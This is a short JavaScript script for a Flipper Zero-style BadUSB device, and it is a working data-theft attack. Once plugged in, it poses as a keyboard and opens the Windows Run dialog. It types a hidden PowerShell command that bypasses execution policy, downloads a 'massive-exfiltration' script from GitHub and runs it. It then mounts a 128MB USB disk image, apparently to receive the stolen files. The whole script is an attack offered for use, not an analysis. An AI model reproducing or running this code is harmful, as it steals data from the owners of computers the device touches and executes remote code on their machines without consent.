let usbdisk = require("usbdisk");
let storage = require("storage");
let badusb = require("badusb");
let notify = require("notification");
let diskPath = "/ext/apps_data/mass_storage/128MB.img";

// Only supported layout is US right now

if (!storage.exists(diskPath)) {
  print("Creating image...");
  usbdisk.createImage(diskPath, 128 * 1024 * 1024);
}
badusb.setup({
  vid: 0xaaaa,
  pid: 0xbbbb,
  mfr_name: "Flipper",
  prod_name: "Zero",
});
// Wait until connected
while (!badusb.isConnected()) {
  delay(1000);
}

// After connected

notify.blink("red", "long");
print("USB is connected");
badusb.press("GUI", "r");
delay(500);
badusb.println(
  "powershell -w h -Ep Bypass irm https://raw.githubusercontent.com/SuperJakov/Badusb/dev/massive-exfiltration/no-input-massive-exfil.ps1 | iex"
);
badusb.quit();
delay(3000);
usbdisk.start(diskPath);
print("UsbDisk startsed...");
//print("Started, waiting until ejected...");
while (!usbdisk.wasEjected()) {
  notify.blink("green", "long");
  delay(1000);
}
notify.success();
print("Ejected, stopping UsbDisk...");
usbdisk.stop();
print("Done");
